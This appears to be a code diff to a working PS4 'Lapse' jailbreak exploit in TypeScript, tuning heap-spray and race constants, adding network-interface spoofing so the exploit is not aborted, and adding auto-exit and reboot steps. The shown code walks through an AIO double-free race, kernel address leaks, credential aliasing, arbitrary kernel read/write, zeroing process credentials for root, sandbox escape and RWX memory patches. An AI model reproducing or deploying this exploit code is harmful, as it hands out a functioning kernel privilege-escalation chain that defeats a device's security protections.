@@ -1,6 +1,7 @@
 import { fn, BigInt, syscalls, gadgets, mem, rop, utils } from 'download0/types'
 import { kernel, apply_kernel_patches, hex, malloc, read16, read32, read64, read8, write16, write32, write64, write8, get_fwversion, send_notification, get_kernel_offset, get_mmap_patch_offsets } from 'download0/kernel'
 import { libc_addr } from 'download0/userland'
+import { exit_app, reboot_ps4 } from 'download0/loader'
 
 include('kernel.js')
 
@@ -27,14 +28,14 @@ const PAGE_SIZE = 0x4000
 const MAIN_CORE = 4
 const MAIN_RTPRIO = 0x100
 const NUM_WORKERS = 4          // was 2   — more AIO blocking workers
-const NUM_GROOMS = 0x300      // was 0x200 — larger heap groom
+const NUM_GROOMS  = 0x300      // was 0x200 — larger heap groom
 const NUM_HANDLES = 0x180      // was 0x100 — more evf handles for better aliasing
-const NUM_SDS = 96         // was 64   — bigger rthdr spray
+const NUM_SDS     = 96         // was 64   — bigger rthdr spray
 const NUM_SDS_ALT = 72         // was 48   — ditto for alt set
-const NUM_RACES = 200        // was 100  — more AIO race attempts
-const NUM_ALIAS = 200        // was 100  — more alias search loops
-const LEAK_LEN = 16
-const NUM_LEAKS = 64         // was 32   — more leak slots
+const NUM_RACES   = 200        // was 100  — more AIO race attempts
+const NUM_ALIAS   = 200        // was 100  — more alias search loops
+const LEAK_LEN    = 16
+const NUM_LEAKS   = 64         // was 32   — more leak slots
 const NUM_CLOBBERS = 16        // was 8    — more clobber attempts
 const MAX_AIO_IDS = 0x100      // was 0x80 — larger AIO id pool
 const MAX_FULL_RESTARTS_LAPSE = 4  // full teardown+reinit cycles
@@ -709,38 +710,90 @@ function make_aliased_rthdrs (sds: BigInt[]): [BigInt, BigInt] | null {
 }
 
 // ---------------------------------------------------------------------------
-// Network-state spoofing (same technique as netctrl variant)
-// Forces kernel to walk ifnet list → deterministic heap allocations
-// that improve AIO/evf spray layout.
+// Network-state spoofing
+// Spoofs lo0 + en0 (real LAN interface) so netctl daemon stops raising
+// disconnect events that can abort the exploit mid-run.
+// Must register ioctl here — lapse does not share fn state with netctrl.
 // ---------------------------------------------------------------------------
-const SIOCGIFFLAGS_LAPSE = 0xC0206911
-const SIOCSIFFLAGS_LAPSE = 0x80206910
-const IFF_UP_LAPSE = 0x0001
-const IFF_RUNNING_LAPSE = 0x0040
-const IFREQ_SIZE_LAPSE = 32
+const SIOCGIFFLAGS_LAPSE  = 0xC0206911
+const SIOCSIFFLAGS_LAPSE  = 0x80206910
+const SIOCSIFADDR_LAPSE   = 0x8020690C
+const IFF_UP_LAPSE        = 0x0001
+const IFF_RUNNING_LAPSE   = 0x0040
+const IFF_BROADCAST_LAPSE = 0x0002
+const IFREQ_SIZE_LAPSE    = 32
+const SOCKADDR_IN_SIZE_LAPSE = 16
 
 function spoof_network_connected_lapse () {
   try {
-    const ifreq = malloc(IFREQ_SIZE_LAPSE)
-    const name = 'lo0'
-    for (let i = 0; i < name.length; i++) {
-      write8(ifreq.add(i), name.charCodeAt(i))
-    }
-    write8(ifreq.add(name.length), 0)
+    // Register ioctl — required here, lapse fn scope is independent
+    fn.register(0x36, 'ioctl_lapse', ['bigint', 'number', 'bigint'], 'bigint')
+    const ioctl_l = fn.ioctl_lapse
+
+    const BigInt_Err = new BigInt(0xFFFFFFFF, 0xFFFFFFFF)
 
     const sd = socket(AF_INET, SOCK_DGRAM, 0)
-    if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-      log('[net-spoof] inet socket unavailable — skipping')
+    if (sd.eq(BigInt_Err)) {
+      log('[net-spoof] inet socket unavailable - skipping')
       return
     }
-    const r = ioctl(sd, SIOCGIFFLAGS_LAPSE, ifreq)
-    if (!r.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-      const flags = Number(read16(ifreq.add(16))) | IFF_UP_LAPSE | IFF_RUNNING_LAPSE
-      write16(ifreq.add(16), flags)
-      ioctl(sd, SIOCSIFFLAGS_LAPSE, ifreq)
-      log('[net-spoof] lo0 marked UP+RUNNING (flags=0x' + flags.toString(16) + ')')
+
+    // Helper: set IFF_UP | IFF_RUNNING | IFF_BROADCAST on named interface
+    function spoof_iface (name: string): boolean {
+      const ifreq = malloc(IFREQ_SIZE_LAPSE)
+      for (let i = 0; i < Math.min(name.length, 15); i++) {
+        write8(ifreq.add(i), name.charCodeAt(i))
+      }
+      write8(ifreq.add(Math.min(name.length, 15)), 0)
+
+      const r = ioctl_l(sd, SIOCGIFFLAGS_LAPSE, ifreq)
+      if (r.eq(BigInt_Err)) return false
+
+      const nf = Number(read16(ifreq.add(16))) | IFF_UP_LAPSE | IFF_RUNNING_LAPSE | IFF_BROADCAST_LAPSE
+      write16(ifreq.add(16), nf)
+      ioctl_l(sd, SIOCSIFFLAGS_LAPSE, ifreq)
+      log('[net-spoof] ' + name + ' flags -> 0x' + nf.toString(16))
+      return true
     }
+
+    // Helper: assign fake static IP to interface
+    function assign_ip (name: string, a: number, b: number, c: number, d: number) {
+      const ifreq = malloc(32)
+      for (let i = 0; i < Math.min(name.length, 15); i++) {
+        write8(ifreq.add(i), name.charCodeAt(i))
+      }
+      write8(ifreq.add(Math.min(name.length, 15)), 0)
+      // sockaddr_in at offset 16: sin_len, sin_family, sin_port, sin_addr
+      write8(ifreq.add(16), SOCKADDR_IN_SIZE_LAPSE)
+      write8(ifreq.add(17), AF_INET)
+      write16(ifreq.add(18), 0)
+      write8(ifreq.add(20), a)
+      write8(ifreq.add(21), b)
+      write8(ifreq.add(22), c)
+      write8(ifreq.add(23), d)
+      const r = ioctl_l(sd, SIOCSIFADDR_LAPSE, ifreq)
+      if (r.eq(BigInt_Err)) {
+        log('[net-spoof] SIOCSIFADDR failed for ' + name + ' (may already have IP - OK)')
+      } else {
+        log('[net-spoof] ' + name + ' IP -> ' + a + '.' + b + '.' + c + '.' + d)
+      }
+    }
+
+    // 1. Spoof lo0 — heap feng shui
+    spoof_iface('lo0')
+
+    // 2. Spoof real LAN interface — silences netctl disconnect watchdog
+    const eth_names = ['en0', 'igb0', 'em0']
+    for (let i = 0; i < eth_names.length; i++) {
+      if (spoof_iface(eth_names[i]!)) {
+        assign_ip(eth_names[i]!, 192, 168, 169, 1)
+        log('[net-spoof] LAN spoof complete on ' + eth_names[i])
+        break
+      }
+    }
+
     close(sd)
+    log('[net-spoof] done')
   } catch (e) {
     log('[net-spoof] skipped: ' + (e as Error).message)
   }
@@ -823,11 +876,11 @@ function setup () {
       }
       sds_alt[sdsAltIdx++] = sd
     }
-    log('[init] IPv6 sockets ready — main[' + NUM_SDS + '] alt[' + NUM_SDS_ALT + ']')
+    log('[init] IPv6 sockets ready - main[' + NUM_SDS + '] alt[' + NUM_SDS_ALT + ']')
 
     return true
   } catch (e) {
-    log('[✗] Setup error: ' + (e as Error).message)
+    log('[ERR] Setup error: ' + (e as Error).message)
     return false
   }
 }
@@ -1876,8 +1929,8 @@ function make_kernel_arw (pktopts_sds: BigInt[], reqs1_addr: BigInt, kernel_addr
 
 export function lapse () {
   // ── Setup visible log screen so user sees progress ────────────────────────
-  const LAPSE_LOG_MAX = 26
-  const LAPSE_LOG_H = 32
+  const LAPSE_LOG_MAX  = 26
+  const LAPSE_LOG_H    = 32
   const lapseLogBuf: string[] = []
   const lapseLogLines: jsmaf.Text[] = []
 
@@ -1888,35 +1941,29 @@ export function lapse () {
 
     const bg = new Image({
       url: 'file:///../download0/img/multiview_bg_VAF.png',
-      x: 0,
-      y: 0,
-      width: 1920,
-      height: 1080
+      x: 0, y: 0, width: 1920, height: 1080
     })
     jsmaf.root.children.push(bg)
 
     const logo = new Image({
       url: 'file:///../download0/img/logo.png',
-      x: 1620,
-      y: 0,
-      width: 300,
-      height: 169
+      x: 1620, y: 0, width: 300, height: 169
     })
     jsmaf.root.children.push(logo)
 
     const titleTxt = new jsmaf.Text()
-    titleTxt.text = 'Lapse Jailbreak Running...'
-    titleTxt.x = 40
-    titleTxt.y = 40
+    titleTxt.text  = 'Lapse Jailbreak Running'
+    titleTxt.x     = 40
+    titleTxt.y     = 40
     titleTxt.style = 'lapse_title'
     jsmaf.root.children.push(titleTxt)
 
     for (let i = 0; i < LAPSE_LOG_MAX; i++) {
       const line = new jsmaf.Text()
-      line.text = ''
+      line.text  = ''
       line.style = 'lapse_log'
-      line.x = 40
-      line.y = 100 + i * LAPSE_LOG_H
+      line.x     = 40
+      line.y     = 100 + i * LAPSE_LOG_H
       jsmaf.root.children.push(line)
       lapseLogLines.push(line)
     }
@@ -1935,16 +1982,14 @@ export function lapse () {
   // (individual internal log() calls remain untouched for compatibility)
 
   try {
-    lapseLog('╔══════════════════════════════╗')
-    lapseLog('║    PS4 Lapse Jailbreak       ║')
-    lapseLog('╚══════════════════════════════╝')
+    lapseLog('=== PS4 Lapse Jailbreak ===')
 
     FW_VERSION = get_fwversion()
-    lapseLog('[✓] Firmware detected: ' + FW_VERSION)
+    lapseLog('[OK] Firmware detected: ' + FW_VERSION)
 
     if (FW_VERSION === null) {
-      lapseLog('[✗] Could not detect firmware version — aborting')
-      send_notification('[VAF] Firmware detection failed — aborting')
+      lapseLog('[ERR] Could not detect firmware version - aborting')
+      send_notification('[VAF] Firmware detection failed - aborting')
       return false
     }
 
@@ -1959,68 +2004,68 @@ export function lapse () {
     }
 
     if (compare_version(FW_VERSION, '7.00') < 0 || compare_version(FW_VERSION, '12.02') > 0) {
-      lapseLog('[✗] FW ' + FW_VERSION + ' not supported (7.00–12.02 required)')
-      send_notification('[VAF] Unsupported firmware — aborting')
+      lapseLog('[ERR] FW ' + FW_VERSION + ' not supported (7.00-12.02 required)')
+      send_notification('[VAF] Unsupported firmware - aborting')
       return false
     }
 
     kernel_offset = get_kernel_offset(FW_VERSION)
-    lapseLog('[✓] Kernel offsets loaded for FW ' + FW_VERSION)
+    lapseLog('[OK] Kernel offsets loaded for FW ' + FW_VERSION)
 
     // ── Full restart loop ────────────────────────────────────────────────────
     for (let run = 0; run <= MAX_FULL_RESTARTS_LAPSE; run++) {
       if (run > 0) {
-        lapseLog('[~] Full restart #' + run + '/' + MAX_FULL_RESTARTS_LAPSE + ' — resetting state...')
+        lapseLog('[~] Full restart #' + run + '/' + MAX_FULL_RESTARTS_LAPSE + ' - resetting state...')
         cleanup_fail()
       }
 
       // === STAGE 0: Setup ===
-      lapseLog('[*] Stage 0 — Initializing environment (run ' + (run + 1) + ')...')
+      lapseLog('[*] Stage 0 - Initializing environment (run ' + (run + 1) + ')...')
       const setup_success = setup()
       if (!setup_success) {
-        lapseLog('[✗] Setup failed — ' + (run < MAX_FULL_RESTARTS_LAPSE ? 'retrying...' : 'giving up'))
+        lapseLog('[ERR] Setup failed - ' + (run < MAX_FULL_RESTARTS_LAPSE ? 'retrying...' : 'giving up'))
         send_notification('[VAF-Lapse] Setup failed')
         if (run >= MAX_FULL_RESTARTS_LAPSE) return false
         continue
       }
-      lapseLog('[✓] Environment ready')
+      lapseLog('[OK] Environment ready')
 
       // === STAGE 1: Double-free AIO race ===
-      lapseLog('[>] Stage 1 — AIO double-free race (' + NUM_RACES + ' attempts)...')
+      lapseLog('[>] Stage 1 - AIO double-free race (' + NUM_RACES + ' attempts)...')
       sd_pair = double_free_reqs2()
 
       if (sd_pair === null) {
-        lapseLog('[~] Stage 1 failed — race window missed')
+        lapseLog('[~] Stage 1 failed - race window missed')
         send_notification('[VAF-Lapse] Stage 1 failed')
         if (run >= MAX_FULL_RESTARTS_LAPSE) return false
         continue
       }
-      lapseLog('[✓] Stage 1 — race won, UAF socket pair acquired')
+      lapseLog('[OK] Stage 1 - race won, UAF socket pair acquired')
 
       if (sds === null) {
-        lapseLog('[~] Socket list lost after race — restarting')
+        lapseLog('[~] Socket list lost after race - restarting')
         if (run >= MAX_FULL_RESTARTS_LAPSE) return false
         continue
       }
 
       // === STAGE 2: Leak kernel addresses ===
-      lapseLog('[>] Stage 2 — Leaking kernel addresses via evf/rthdr confusion...')
+      lapseLog('[>] Stage 2 - Leaking kernel addresses via evf/rthdr confusion...')
       const leak_result = leak_kernel_addrs(sd_pair, sds)
       if (leak_result === null) {
-        lapseLog('[~] Stage 2 failed — kernel leak missed')
+        lapseLog('[~] Stage 2 failed - kernel leak missed')
         cleanup_fail()
         if (run >= MAX_FULL_RESTARTS_LAPSE) return false
         continue
       }
-      lapseLog('[✓] Stage 2 — kernel addresses leaked')
-      log('[✓] kbuf  @ ' + hex(leak_result.kbuf_addr))
-      log('[✓] kbase hint @ ' + hex(leak_result.kernel_addr))
-      log('[✓] reqs1 @ ' + hex(leak_result.reqs1_addr))
-      log('[✓] aio_info @ ' + hex(leak_result.aio_info_addr))
-      log('[✓] evf   @ ' + hex(leak_result.evf))
+      lapseLog('[OK] Stage 2 - kernel addresses leaked')
+      log('[OK] kbuf  @ ' + hex(leak_result.kbuf_addr))
+      log('[OK] kbase hint @ ' + hex(leak_result.kernel_addr))
+      log('[OK] reqs1 @ ' + hex(leak_result.reqs1_addr))
+      log('[OK] aio_info @ ' + hex(leak_result.aio_info_addr))
+      log('[OK] evf   @ ' + hex(leak_result.evf))
 
       // === STAGE 3: Double-free SceKernelAioRWRequest ===
-      lapseLog('[>] Stage 3 — UCred aliasing via AioRWRequest double-free...')
+      lapseLog('[>] Stage 3 - UCred aliasing via AioRWRequest double-free...')
       const pktopts_sds = double_free_reqs1(
         leak_result.reqs1_addr,
         leak_result.target_id,
@@ -2034,15 +2079,15 @@ export function lapse () {
       close(leak_result.fake_reqs3_sd!)
 
       if (pktopts_sds === null) {
-        lapseLog('[~] Stage 3 failed — aliasing missed')
+        lapseLog('[~] Stage 3 failed - aliasing missed')
         cleanup_fail()
         if (run >= MAX_FULL_RESTARTS_LAPSE) return false
         continue
       }
-      lapseLog('[✓] Stage 3 — aliased socket pair: ' + hex(pktopts_sds[0]) + ' ↔ ' + hex(pktopts_sds[1]))
+      lapseLog('[OK] Stage 3 - aliased socket pair: ' + hex(pktopts_sds[0]) + ' <-> ' + hex(pktopts_sds[1]))
 
       // === STAGE 4: Arbitrary kernel R/W ===
-      lapseLog('[>] Stage 4 — Building kernel R/W primitives...')
+      lapseLog('[>] Stage 4 - Building kernel R/W primitives...')
       const arw_result = make_kernel_arw(
         pktopts_sds,
         leak_result.reqs1_addr,
@@ -2053,15 +2098,15 @@ export function lapse () {
       )
 
       if (arw_result === null) {
-        lapseLog('[~] Stage 4 failed — R/W setup missed')
+        lapseLog('[~] Stage 4 failed - R/W setup missed')
         cleanup_fail()
         if (run >= MAX_FULL_RESTARTS_LAPSE) return false
         continue
       }
-      lapseLog('[✓] Stage 4 — Kernel R/W established')
+      lapseLog('[OK] Stage 4 - Kernel R/W established')
 
       // === STAGE 5: Jailbreak ===
-      lapseLog('[>] Stage 5 — Escaping sandbox...')
+      lapseLog('[>] Stage 5 - Escaping sandbox...')
 
       const OFFSET_P_UCRED = 0x40
       const proc = kernel.addr.curproc
@@ -2071,14 +2116,14 @@ export function lapse () {
       }
 
       kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET)
-      log('[✓] Kernel base: ' + hex(kernel.addr.base))
+      log('[OK] Kernel base: ' + hex(kernel.addr.base))
 
       const uid_before = Number(getuid())
       const sandbox_before = Number(is_in_sandbox())
       log('[*] BEFORE: uid=' + uid_before + ' sandbox=' + sandbox_before)
 
       const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))!
-      const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
+      const ucred   = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
 
       kernel.write_dword(ucred.add(0x04), 0)
       kernel.write_dword(ucred.add(0x08), 0)
@@ -2095,21 +2140,21 @@ export function lapse () {
       kernel.write_qword(proc_fd.add(0x10), rootvnode)
       kernel.write_qword(proc_fd.add(0x18), rootvnode)
 
-      const uid_after = Number(getuid())
+      const uid_after     = Number(getuid())
       const sandbox_after = Number(is_in_sandbox())
       log('[*] AFTER:  uid=' + uid_after + ' sandbox=' + sandbox_after)
 
       if (uid_after === 0 && sandbox_after === 0) {
-        lapseLog('[✓] Sandbox escaped — root achieved')
+        lapseLog('[OK] Sandbox escaped - root achieved')
       } else {
-        lapseLog('[!] Sandbox escape may have failed — continuing anyway')
+        lapseLog('[!] Sandbox escape may have failed - continuing anyway')
       }
 
       // Kernel patches
       lapseLog('[>] Applying kernel patches...')
       const kpatch_result = apply_kernel_patches(FW_VERSION)
       if (kpatch_result) {
-        lapseLog('[✓] Kernel patches applied')
+        lapseLog('[OK] Kernel patches applied')
         let all_ok = true
 
         const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
@@ -2117,22 +2162,22 @@ export function lapse () {
           const byte1 = Number(ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[0])).and(0xff))
           const byte2 = Number(ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[1])).and(0xff))
           if (byte1 === 0x37 && byte2 === 0x37) {
-            log('[✓] mmap RWX patch verified')
+            log('[OK] mmap RWX patch verified')
           } else {
             log('[!] mmap RWX: got 0x' + byte1.toString(16) + '/0x' + byte2.toString(16) + ' (expected 0x37)')
             all_ok = false
           }
         } else {
-          log('[~] mmap RWX offsets not available for FW ' + FW_VERSION + ' — skipping')
+          log('[~] mmap RWX offsets not available for FW ' + FW_VERSION + ' - skipping')
         }
 
         try {
-          const PROT_RWX = 0x7
-          const MAP_ANON = 0x1000
+          const PROT_RWX  = 0x7
+          const MAP_ANON  = 0x1000
           const MAP_PRIVATE = 0x2
           const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
           if (Number(test_addr.shr(32)) < 0xffff8000) {
-            log('[✓] mmap RWX functional @ ' + hex(test_addr))
+            log('[OK] mmap RWX functional @ ' + hex(test_addr))
             munmap(test_addr, 0x1000)
           } else {
             log('[!] mmap RWX test returned invalid address')
@@ -2143,25 +2188,30 @@ export function lapse () {
           all_ok = false
         }
 
-        lapseLog(all_ok ? '[✓] All patches verified OK' : '[!] Some patches may have failed — continuing')
+        lapseLog(all_ok ? '[OK] All patches verified OK' : '[!] Some patches may have failed - continuing')
       } else {
-        lapseLog('[!] Kernel patches failed — continuing without them')
+        lapseLog('[!] Kernel patches failed - continuing without them')
       }
 
-      lapseLog('[✓✓✓] JAILBREAK COMPLETE')
-      utils.notify('VAF Lapse — Done!\nYou are now free. Enjoy.')
+      lapseLog('[DONE] JAILBREAK COMPLETE')
+      utils.notify('VAF Lapse - Done!\nYou are now free. Enjoy.')
 
       cleanup()
+      exit_app(4000)  // auto-exit after 4 seconds
       return true
+
     } // end restart loop
 
-    lapseLog('[✗] All restart attempts exhausted — reboot and try again')
-    send_notification('[VAF-Lapse] Failed — please reboot')
+    lapseLog('[ERR] All restart attempts exhausted - rebooting PS4...')
+    send_notification('[VAF-Lapse] Failed - rebooting...')
+    reboot_ps4(6000)
     return false
+
   } catch (e) {
-    lapseLog('[✗] Fatal error: ' + (e as Error).message)
-    utils.notify('[VAF-Lapse] Fatal error — reboot and try again')
+    lapseLog('[ERR] Fatal error: ' + (e as Error).message)
+    utils.notify('[VAF-Lapse] Fatal error - rebooting...')
     log((e as Error).stack ?? '')
+    reboot_ps4(6000)
     return false
   }
 }
@@ -2235,7 +2285,7 @@ function cleanup () {
 }
 
 function cleanup_fail () {
-  utils.notify('Lapse Failed! reboot and try again! UwU')
+  utils.notify('Lapse Failed - reboot and try again!')
   jsmaf.root.children.push(bg_fail)
   cleanup()
 }
